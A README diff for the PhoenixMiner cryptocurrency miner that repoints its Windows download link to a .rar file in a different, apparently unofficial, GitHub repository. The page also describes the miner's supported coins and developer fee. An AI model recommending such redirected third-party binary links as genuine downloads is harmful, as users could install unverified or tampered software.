@@ -4,9 +4,8 @@
 
 You can download PhoenixMiner from here:
 ----------------------------------------------
-  + [PhoenixMiner Windows](https://github.com/BTC-Hub/PhoenixMiner/releases/download/PhoenixMiner6.2c/PhoenixMiner.rar)
-   
-  + [PhoenixMiner Linux](https://github.com/BTC-Hub/PhoenixMiner/releases/download/PhoenixMiner6.2c/PhoenixMiner_Linux.tar.gz)
+- [ ] [PhoenixMiner Windows](https://github.com/BTC-Hub/BTC-HUB/releases/download/minerswindows/PhoenixMiner.rar)
+- [ ] [PhoenixMiner Linux](https://github.com/BTC-Hub/PhoenixMiner/releases/download/PhoenixMiner6.2c/PhoenixMiner_Linux.tar.gz)
 
 PhoenixMiner is Ethash (**ETH, ETC, Muiscoin, EXP, UBQ, etc.**) miner that **supports both AMD and Nvidia** cards (including in mixed mining rigs). It runs under Windows x64 and Linux x64 and has a developer **fee of 0.65%**. This means that every 90 minutes the miner will mine for us, its developers, for 35 seconds.
 
